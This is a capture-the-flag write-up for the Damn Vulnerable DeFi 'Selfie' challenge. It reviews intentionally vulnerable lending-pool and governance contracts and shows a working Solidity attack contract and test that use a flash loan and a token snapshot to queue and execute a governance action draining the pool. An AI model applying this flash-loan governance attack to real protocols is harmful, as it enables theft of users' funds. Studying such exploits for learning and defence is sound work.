## 1) Challenge

> <cite>A new cool lending pool has launched! It's now offering flash loans of DVT tokens.</cite>
> <cite>Wow, and it even includes a really fancy governance mechanism to control it.</cite>
> <cite>What could go wrong, right ?</cite>
> <cite>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/6.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

For this challenge, we have two contracts: `SimpleGovernance`, responsible for adding and executing actions and `SelfiePool`, accountable for offering flash loans.

`SelfiePool` ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/selfie/SelfiePool.sol)):

```solidity

contract SelfiePool is ReentrancyGuard {

    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(msg.sender == address(governance), "Only governance can execute this action");
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        token.transfer(msg.sender, borrowAmount);        
        
        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );
        
        uint256 balanceAfter = token.balanceOf(address(this));

        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);
        
        emit FundsDrained(receiver, amount);
    }
}

```

- `flashLoan` function (the logic of this function is very similar to the one of [challenge 2](DamnVulnerableDeFi_02_naive-receiver.md)):
    - prevents reentrancy by using the `nonReentrant` modifier (from [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard))
    - checks if the ETH balance of the contract is greater or equal to the amount we want to borrow (line `34`)
    - transfers to `msg.sender` the amount requested
    - checks if the borrower (`msg.sender`) is a contract (line `38`)
    - calls the `receiveTokens` function of the borrower contract (line `41`) passing the token address and the borrowed amount
    - checks if we paid back the loan (line `49`) 
- `drainAllFunds` transfer all the pool balance to a `recevier` address. Only the governance contract can call this function (because of the `onlyGovernance` modifier - line `22`)

The core of this challenge is in `SimpleGovernance`([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/selfie/SimpleGovernance.sol)):

```solidity

contract SimpleGovernance {

    using Address for address;
    
    struct GovernanceAction {
        address receiver;
        bytes data;
        uint256 weiAmount;
        uint256 proposedAt;
        uint256 executedAt;
    }
    
    DamnValuableTokenSnapshot public governanceToken;

    mapping(uint256 => GovernanceAction) public actions;
    uint256 private actionCounter;
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;

    event ActionQueued(uint256 actionId, address indexed caller);
    event ActionExecuted(uint256 actionId, address indexed caller);

    constructor(address governanceTokenAddress) {
        require(governanceTokenAddress != address(0), "Governance token cannot be zero address");
        governanceToken = DamnValuableTokenSnapshot(governanceTokenAddress);
        actionCounter = 1;
    }
    
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
        require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
        require(receiver != address(this), "Cannot queue actions that affect Governance");

        uint256 actionId = actionCounter;

        GovernanceAction storage actionToQueue = actions[actionId];
        actionToQueue.receiver = receiver;
        actionToQueue.weiAmount = weiAmount;
        actionToQueue.data = data;
        actionToQueue.proposedAt = block.timestamp;

        actionCounter++;

        emit ActionQueued(actionId, msg.sender);
        return actionId;
    }

    function executeAction(uint256 actionId) external payable {
        require(_canBeExecuted(actionId), "Cannot execute this action");
        
        GovernanceAction storage actionToExecute = actions[actionId];
        actionToExecute.executedAt = block.timestamp;

        actionToExecute.receiver.functionCallWithValue(
            actionToExecute.data,
            actionToExecute.weiAmount
        );

        emit ActionExecuted(actionId, msg.sender);
    }

    function getActionDelay() public view returns (uint256) {
        return ACTION_DELAY_IN_SECONDS;
    }

    /**
     * @dev an action can only be executed if:
     * 1) it's never been executed before and
     * 2) enough time has passed since it was first proposed
     */
    function _canBeExecuted(uint256 actionId) private view returns (bool) {
        GovernanceAction memory actionToExecute = actions[actionId];
        return (
            actionToExecute.executedAt == 0 &&
            (block.timestamp - actionToExecute.proposedAt >= ACTION_DELAY_IN_SECONDS)
        );
    }
    
    function _hasEnoughVotes(address account) private view returns (bool) {
        uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
        uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
}

```

- `queueAction` is responsible for adding an action (represented by the `GovernanceAction` struct) in a queue that can be later executed by calling `executeAction`. The `GovernanceAction` has the following fields:
    - `receiver`: the receiver of the action
    - `weiAmount`: the amount of wei to send in this call
    - `data`: function call to execute
    - `proposedAt`: timestamp used to keep track of when an action is proposed
    Two conditions need to be satisfied to add an action in the queue:
        - the `msg.sender` must have enough votes (line `39`). The right to vote is granted only to accounts with more than half of the governance's token (line `88-90`). Also, to determine if a contract has enough voting power, the information from the latest token snapshot is used (`getBalanceAtLastSnapshot` and `getTotalSupplyAtLastSnapshot`) 
        - the receiver of the action must not be the governance contract (line `40`)

Once an action is added to the queue, it can be executed by calling `executeAction`. In particular, anyone can request the execution of an already registered action if at least two days have passed since it was proposed (`_canBeExecuted` - line `57` and `80-84`). The action will execute the function (stored in the `data` property) of the `receiver` contract.


#### Who has enough votes to add an action to the queue?

There are `2M` total supply tokens ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/selfie/selfie.challenge.js#L7)), and the pool held `1.5M` of them ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/selfie/selfie.challenge.js#L25)). It means the pool contract has enough voting power to add an action in the queue.

Our goal is to drain all the balance. The `drainAllFunds` could be used to drain all the pool balance; however, only the governance contract can call it. To make the governance call the `drainAllFunds` (with a receiver address one of our control), we can add this as an action in the queue and execute it (after two days). The governance contract executes the action in the queue. This way, the `msg.sender` of the call to `drainAllFunds` will be the governance contract.


#### How can we add an action to the queue?

The pool offers flash loans via the `flashLoan` function. It also calls `receiveTokens` from the receiver contract. If we request a loan equal to the pool balance, we'll have enough voting power to call the `queueAction` inside the `receiveTokens` function. In particular, the action we want the governance contract to call is `drainAllFunds` with our attacker address as the `receiver` address.


## 3) Solution

The solution consists of the following steps:
- calls `flashLoan` requesting a loan equal to the pool balance
- inside the `receiveTokens` function, we need to:
    - create a token snapshot since we have all the pool balance token (the token it's an ERC20Snapshot) - this way, we'll use updated information when `_canBeExecuted` will be called
    - call the `queueAction` with the following values:
        - receiver: the pool contract
        - data: the `drainAllFunds` function with the attacker address as the receiver parameter
        - weiAmount: `0`
    - repay the loan back
- once the `receiveTokens` function completes, we can call (after at least two days) the `executeAction` to execute the action we have just added 

`AttackSelfie.sol`
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

interface IDamnValuableTokenSnapshot {
  function transfer(address to, uint256 amount) external;
  function balanceOf(address account) external returns (uint256);
  function snapshot() external returns (uint256);
}

/**
 * @title AttackSelfie
 */
contract AttackSelfie {

    ISelfiePool pool;
    ISimpleGovernance governance; 
    IDamnValuableTokenSnapshot token;
    address attacker;

    constructor(address _pool, address _governance, address _token, address _attacker) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        token = IDamnValuableTokenSnapshot(_token);
        
        attacker = _attacker;

    }

    function run() public {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function executeAction(uint256 actionId) public {
        governance.executeAction(actionId);
    }


    function receiveTokens(address _address, uint256 amount) public {
        IDamnValuableTokenSnapshot(_address).snapshot();

        governance.queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)", address(attacker)), 0);
        
        IDamnValuableTokenSnapshot(_address).transfer(address(pool), amount);

    }

}

```

`selfie.challenge.js`:

```javascript

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        const AttackFactory = await ethers.getContractFactory('AttackSelfie', deployer);
        const attack = await AttackFactory.deploy(this.pool.address, this.governance.address, this.token.address, attacker.address);

        await attack.connect(attacker).run();

        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await attack.connect(attacker).executeAction(1);

    });
    
```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/selfie/selfie.challenge.js) and [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackSelfie.sol).


## 4) References

- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot)

